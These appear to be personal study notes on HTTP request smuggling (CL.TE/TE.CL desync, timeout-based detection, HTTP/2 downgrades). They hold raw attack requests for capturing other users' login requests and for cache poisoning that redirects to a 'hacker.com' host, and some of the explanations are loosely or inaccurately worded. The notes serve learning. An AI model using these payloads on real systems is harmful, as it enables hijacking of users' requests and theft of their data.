`Frontend` and `backend` server process request differently based on Content length `CL` and Transfer encoding `TE`. `Frontend` may support `CL` and `backend` may support `TE` or both support `TE`.

`NGNIX`, `HAproxy` and `CDN` are front-end while `Apache2` and `Nodejs` etc are back-end servers.

If read data chunk size error occur so it return `Read Timeout`  and if add something which is invalid so return `Invalid Request`.  Mean first server using `TE`.

`Communication Time out` error occur when `backend` server wait for data but not get at time. `Backend` supporting content length.

In `TE.CL` we need to add `\n\r` in second post request at end `0`.  In `TE` we provide size and then bytes `data` and `CL` start from data to end of `\r\n`

Request Smuggling only possible in `HTTP/1` not in `HTTP/2`. Some server may show `HTTP/2` but they may using this on `fronend` `HTTP/1` will being used at `Backend`.

#### Modern Web Applications
![[adaa5ac3ca48557bdf12e4b7758fd429.svg]]

Single server websites are not vulnerable to `Request Smuggling` who are not using `CDN` or load `balancers`.  
####  Caching Mechanisms
![[download.png]]
#### Headers Affect Request Processing
![[2e8e7deef6eaa04f3461647e61bf3566.svg]]
## Detecting: 
If time out error on invalid chunk size so its mean site is vulnerable to `Http Request Smuggling`
![[Chk.png]]

#### HTTP Request Smuggling Origin
![[Pasted image 20251207004548.png]]

Transfer encoding use to specify that message body is using chunked encoding. Message body may contain one or more chunks of data. Each chunk consist of chunk size in bytes. Read more [here](https://portswigger.net/web-security/request-smuggling).

```bash
POST /search HTTP/1.1 
Host: normal-website.com 
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 

b 

q=smuggling 
0
```

If server response with `Error:Invalid Request` mean frond end is not using `Content lenght` may be he will using `TE`. 

### Capturing other users’ requests
if app allow you to comment, retrieve or store textual data you can capture the user request. 

```bash
POST / HTTP/1.1  
Host: login.newrelic.com  
Content-Length: 142  
Transfer-Encoding: chunked  
Transfer-Encoding: x  
  
0  
  
POST /login HTTP/1.1  
Host: login.newrelic.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 100  
…  
login[email]=asdfPOST /login HTTP/1.1  
Host: login.newrelic.com
```

so when it gets reflected back it’ll leak all the internal headers. By increasing content length you can get more data.

```bash
# Please ensure that your email and password are correct.  
  
<input id="email" value="asdfPOST /login HTTP/1.1  
Host: login.newrelic.com  
X-Forwarded-For: 81.139.39.150  
X-Forwarded-Proto: https  
X-TLS-Bits: 128  
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256  
X-TLS-Version: TLSv1.2  
x-nr-external-service: external
```

If you sent less data then content length so server will wait for next data or timeout. It will get remaining data from next request if not time out.

IF a website vulnerable to `HRS` and also `Reflected Xss` so you can add payload and effect the other users.
![[Pasted image 20251206225445.png]]

If site is vulnerable to `Web Cache poisoning` and `HRS` to it will lead to an issue. Here we smuggle the request.
```bash
  
POST / HTTP/1.1  
Host: 0a020048045143e483e7018e00d600f2.web-security-academy.net  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 178  
Transfer-Encoding: chunked  
  
0  
  
GET /post/next?postId=1 HTTP/1.1 ## Off-Site redirection path  
Host: hacker.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 3  
  
x=
```

It receives 200 OK

**Request of web cache poisoning**
```bash
GET /resources/js/tracking.js HTTP/2  
Host: 0a020048045143e483e7018e00d600f2.web-security-academy.net  
Cookie: session=fF51fhFC5Angc7aNwqrjazczitlAazI5  
Sec-Ch-Ua-Platform: "Linux"  
Accept-Language: en-US,en;q=0.9  
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"

```

**Response of the redirect**
```bash
HTTP/2 302 Found  
Location: https://hacker.com/post?postId=2      ## Off-Site redirect  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=30  
Age: 3  
X-Cache: hit  
Content-Length: 0
```

### Pseudo-Headers
In HTTP/1, the first line of  request contains the request method and path. HTTP/2 replaces the request line with a series of pseudo headers. There are five pseudo headers.

```
:method - The request method  
:path - The request path. Note that this includes the query string  
:authority - The Host header, roughly  
:scheme - The request scheme, typically 'http' or 'https'  
:status - The response status code - not used in requests
```

### Binary Protocol
`Http/1` is text based protocol mean every request parsed in form of strings this make `desync` attack possible. but in `Http/2 ` is binary protocol and parsing is based on predefined offsets. It uses human-readable abstraction rather than the actual bytes.

### Message Length
In `HTTP/1`, the length of each message body is indicated by Content-Length or Transfer-Encoding header. In HTTP/2, those headers are redundant because each message body is composed of data frames which have a built-in length field.

### Request Smuggling via HTTP/2 Downgrades
`HTTP/2` downgrading is when a front-end server speaks `HTTP/2 `with clients, but rewrites requests into `HTTP/1.1` before forwarding them on to the back-end server.

### HTTP/2 Request Smuggling Vulnerabilities
Front-ends speaking `HTTP/2` almost always use `HTTP/2`  built-in message length. However, the back-end receiving a downgraded request doesn’t have access to this data, and must use the CL or TE header. This leads to two main types of vulnerability: `H2.CL` and `H2.TE`.

